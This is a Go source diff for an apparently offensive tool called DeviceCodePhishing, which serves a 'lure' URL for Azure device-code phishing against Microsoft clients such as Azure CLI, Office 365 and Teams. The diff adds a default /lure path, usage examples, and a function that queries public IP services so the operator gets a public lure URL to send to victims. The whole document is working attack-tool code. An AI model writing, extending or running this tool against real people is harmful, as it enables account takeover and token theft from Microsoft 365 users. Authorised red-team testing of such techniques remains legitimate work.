@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"io"
 	"log"
 	"log/slog"
 	"net"
@@ -76,7 +77,7 @@ func init() {
 	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
 	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
 	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
-	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path prefix for the lure URL (e.g., /custom)")
+	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path for the lure URL (e.g., /custom) - default is /lure")
 }
 
 var runCmd = &cobra.Command{
@@ -127,12 +128,15 @@ Examples:
   # Using custom ClientId  
   DeviceCodePhishing server --custom-client-id "your-custom-clientid-guid"
   
-  # With custom path
+  # With custom path (URL will be /auth)
   DeviceCodePhishing server --path /auth --client-id azurecli
   
   # With custom user agent
   DeviceCodePhishing server --custom-user-agent "Mozilla/5.0..." --client-id office365
   
+  # Default path (URL will be /lure)
+  DeviceCodePhishing server --client-id msteams
+
 Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// Determine which user agent to use
@@ -214,6 +218,12 @@ Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
 
 		slog.Info("Lure available at", "url", "http://"+host+":"+port+lurePath)
 
+		// Attempt to get public IP
+		publicIP := getPublicIP()
+		if publicIP != "" {
+			slog.Info("Public URL", "url", "http://"+publicIP+":"+port+lurePath)
+		}
+
 		// Listen to HTTP connections and wait
 		log.Fatal(server.ListenAndServe())
 	},
@@ -281,4 +291,37 @@ func getAvailableClientIds() []string {
 		clients = append(clients, key)
 	}
 	return clients
+}
+
+func getPublicIP() string {
+	// Try multiple services to get the public IP
+	services := []string{
+		"https://api.ipify.org",
+		"https://checkip.amazonaws.com",
+		"https://icanhazip.com",
+	}
+
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	for _, service := range services {
+		resp, err := client.Get(service)
+		if err != nil {
+			continue
+		}
+		defer resp.Body.Close()
+
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			continue
+		}
+
+		ip := strings.TrimSpace(string(body))
+		if ip != "" {
+			return ip
+		}
+	}
+
+	return ""
 }
